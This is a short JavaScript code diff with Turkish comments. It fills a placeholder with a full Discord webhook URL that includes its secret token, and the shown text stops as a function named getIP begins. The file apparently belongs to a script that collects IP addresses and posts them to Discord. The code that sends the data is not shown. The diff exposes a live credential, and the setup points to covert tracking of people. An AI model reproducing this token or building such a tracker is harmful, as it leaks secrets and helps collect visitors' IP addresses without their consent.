@@ -1,5 +1,5 @@
 // ==================== BURAYI DOLDUR ====================
-const WEBHOOK_URL = 'SENİN_DISCORD_WEBHOOK_URL';
+const WEBHOOK_URL = 'https://discord.com/api/webhooks/1522159080800518185/RT7oVMuIQVBgp7qb2L5suPst3_txYTRH0pyf9LxoYwgdkAmaWx_z7CVRZfEukqogkG0o';
 // =======================================================
 
 async function getIP() {
